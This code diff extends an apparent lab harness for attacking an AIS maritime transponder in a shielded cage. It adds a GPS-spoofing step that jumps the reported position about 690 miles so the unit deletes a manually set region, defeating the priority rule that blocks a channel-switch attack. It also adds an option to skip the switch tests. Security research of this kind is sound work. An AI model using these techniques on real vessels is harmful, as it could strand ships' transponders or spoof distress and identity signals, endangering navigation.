@@ -902,6 +902,11 @@ def main():
     ap.add_argument("--chanmgmt-postroll", type=float, default=90.0,
                     help="no-injection window after the suite to see whether the victim "
                          "returns to AIS1/AIS2 once the default channels are restored")
+    ap.add_argument("--chanmgmt-no-switch", action="store_true",
+                    help="run the channel-management suite but OMIT the channel-switch cells, so "
+                         "the unit never leaves the default channels and every test self-recovers "
+                         "(fills the M16/M20/M23/power/Tx-Rx rows without stranding the unit). Use "
+                         "this for repeat runs; do the vanish/switch separately when ready to recover.")
     ap.add_argument("--chanmgmt-sweep", action="store_true",
                     help="run ONLY the frequency sweep: try to retune the victim to a range of "
                          "target channels (in-band controls, near-band, OUT-OF-AIS-BAND, and "
@@ -911,6 +916,17 @@ def main():
                     help="run ONLY the restore-to-default broadcast (default channels, high power, "
                          "cleared rate/group). Retune the ais-simulator to the channel the unit is "
                          "STUCK on before running this so the command reaches it.")
+    ap.add_argument("--clear-region", action="store_true",
+                    help="before anything else, feed a position far from the cage so the unit "
+                         "deletes any stored regional operating area by the >500-mile rule (a "
+                         "manually-entered region outranks a Msg 22 and would otherwise block the "
+                         "channel switch). Returns the unit to the clean state, then resumes.")
+    ap.add_argument("--clear-region-offset", type=float, default=10.0,
+                    help="degrees of latitude to jump for --clear-region (10 deg ~ 690 miles > the "
+                         "500-mile deletion threshold)")
+    ap.add_argument("--clear-region-dwell", type=float, default=240.0,
+                    help="seconds to hold the far position so the unit runs its regional-area "
+                         "housekeeping and deletes the out-of-range area")
     ap.add_argument("--photo", choices=["impossible_speed", "forged_identity",
                                         "sart_distress", "dos_noposition"],
                     help="play ONE photogenic attack in an infinite loop (Ctrl-C to stop) so the "
@@ -945,6 +961,26 @@ def main():
     rec(event="session_start", victim_mmsi=args.victim_mmsi,
         start_lat=args.lat, start_lon=args.lon, gps_port=args.gps_port)
     print(f"GPS feeding victim @ {args.lat},{args.lon} on {args.gps_port}")
+
+    # Optional: clear any stored regional operating area before attacking. A manually-entered
+    # region outranks a Msg 22 broadcast, so it blocks the channel switch (observed: the attack
+    # works from a clean unit but not once a manual region is set). Regional area data is deleted
+    # when the unit is >500 miles from where the area was registered, and that distance rule is not
+    # gated by source priority -- so we feed a far-away position, hold it while the unit runs its
+    # regional housekeeping, then return to the cage position in a clean state.
+    if args.clear_region:
+        far_lat = args.lat + args.clear_region_offset
+        miles = args.clear_region_offset * 69.0
+        print(f"clear-region: feeding a position {args.clear_region_offset:.0f} deg (~{miles:.0f} mi) "
+              f"north for {args.clear_region_dwell:.0f}s to delete any stored regional area...")
+        gps.set_position(far_lat, args.lon)
+        rec(event="clear_region_start", far_lat=far_lat, far_lon=args.lon,
+            dwell=args.clear_region_dwell, note="feed >500mi so the unit deletes stored regional areas")
+        time.sleep(args.clear_region_dwell)
+        gps.set_position(args.lat, args.lon)
+        rec(event="clear_region_end", note="returned to cage position; stored regional/manual area should be deleted")
+        print("clear-region: back at the cage position; the unit should now be region-free.")
+
     print(f"settling {args.settle}s so the transponder gets a fix...")
     time.sleep(args.settle)
 
@@ -1092,6 +1128,11 @@ def main():
         # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
         if args.chanmgmt or args.chanmgmt_only:
             cm = build_chanmgmt(ctx)
+            if args.chanmgmt_no_switch:
+                # drop the channel-switch cells; keep everything the unit self-recovers from, so a
+                # repeat run never strands it off-channel (recovery is a painful manual overwrite).
+                cm = [(n, p) for (n, p) in cm if "altchan" not in n]
+                print("    (--chanmgmt-no-switch: channel-switch cells omitted; unit stays on AIS1/AIS2)")
             print("\n" + "=" * 72)
             print("  RF WITNESS REQUIRED. Make sure record_ais.sh is RUNNING on channels AB")
             print("  (AIS1/AIS2, 2087/2088) and LEAVE IT RUNNING until this prints 'CHANMGMT DONE'.")
